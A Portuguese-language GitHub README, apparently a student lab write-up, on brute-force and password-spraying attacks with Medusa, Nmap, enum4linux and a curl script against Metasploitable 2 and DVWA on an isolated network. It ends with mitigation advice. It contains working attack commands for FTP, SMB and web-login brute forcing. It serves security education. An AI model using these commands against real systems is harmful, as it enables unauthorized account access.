# Projeto Prático: Ataques de Força Bruta com Medusa e Ambientes Vulneráveis

## 🎯 Descrição Geral

Este projeto foi desenvolvido como parte do estudo sobre vulnerabilidades e técnicas de auditoria de segurança usando **Kali Linux**, **Medusa** e ambientes vulneráveis como **Metasploitable 2** e **DVWA**. O objetivo é simular ataques controlados, entender como eles funcionam e propor medidas de mitigação.

Esse repositório reúne toda a documentação, wordlists simples criadas para o laboratório e exemplos de comandos utilizados nos testes.

---

## 🖥️ 1. Configuração do Ambiente

### **1.1 Máquinas Virtuais**

Foram criadas duas VMs no VirtualBox:

* **Kali Linux** (atacante)
* **Metasploitable 2** (alvo)

Rede utilizada: **Host-only / Interna**, garantindo isolamento total e segurança.

> ✔️ Confirmado que ambas as máquinas se comunicam via ping.

### **1.2 Ferramentas Utilizadas**

* **Medusa** – ferramenta para ataques de força bruta.
* **Nmap** – mapeamento de portas e serviços.
* **DVWA** – para simulação de brute force em formulário web.
* **SMB / enum4linux** – para password spraying com enumeração de usuários.

---

## 🔍 2. Enumeração Inicial

Antes dos ataques, foi realizado um scan para identificar serviços ativos:

```bash
nmap -sV -sC 192.168.56.101
```

Principais serviços encontrados:

* **FTP – porta 21**
* **SSH – porta 22**
* **SMB – portas 139 / 445**
* **Web – porta 80 (DVWA)**

---

## 🔐 3. Ataques Simulados

### **3.1 Força Bruta em FTP (Medusa)**

Wordlist simples criada para o teste:

```
admin
password
123456
msfadmin
```

Comando utilizado:

```bash
medusa -h 192.168.56.101 -u msfadmin -P wordlist.txt -M ftp
```

**Resultado:** acesso obtido com a senha `msfadmin`.

---

### **3.2 Automação de tentativas em formulário Web (DVWA)**

DVWA configurada em **Security Level: Low**.

Script simples usado para automatizar requisições:

```bash
#!/bin/bash
while read pass; do
  curl -s -X POST -d "username=admin&password=$pass&Login=Login" \
  http://192.168.56.101/dvwa/login.php | grep -q "Login failed"
  if [ $? -ne 0 ]; then
    echo "Senha encontrada: $pass"
    break
  fi
done < wordlist.txt
```

**Resultado:** senha encontrada com a mesma wordlist.

---

### **3.3 Password Spraying em SMB**

Enumeração inicial:

```bash
enum4linux -a 192.168.56.101
```

Após encontrar usuários válidos, tentativa de password spraying:

```bash
medusa -h 192.168.56.101 -U users.txt -p 123456 -M smbnt
```

**Resultado:** credenciais válidas identificadas em um dos usuários listados.

---

## 📁 4. Arquivos Incluídos neste Repositório

* `README.md` — documentação completa do projeto
* `wordlist.txt` — wordlist simples utilizada
* `users.txt` — lista de usuários para o teste SMB
* `dvwa_bruteforce.sh` — script usado no teste web

---

## 🛡️ 5. Recomendações de Mitigação

* Utilizar **senhas fortes** e políticas de complexidade.
* Implementar **bloqueio por tentativas malsucedidas**.
* Ativar **2FA** sempre que possível.
* Utilizar **firewalls** e restringir serviços expostos.
* Monitorar logs e ativar alertas de comportamento suspeito.

---

## 📝 6. Conclusões e Aprendizados

Durante este desafio, foi possível:

* Entender como ataques de força bruta são realizados.
* Explorar o funcionamento do Medusa em diferentes serviços.
* Reconhecer a importância de boas práticas de segurança.
* Documentar o processo e usar o GitHub como portfólio.

Este projeto reforçou a importância de ambientes controlados para estudos e simulou cenários reais de vulnerabilidades simples, mas comuns.

---

✨ *Projeto criado para fins educativos e de aprendizado em segurança da informação.*

---

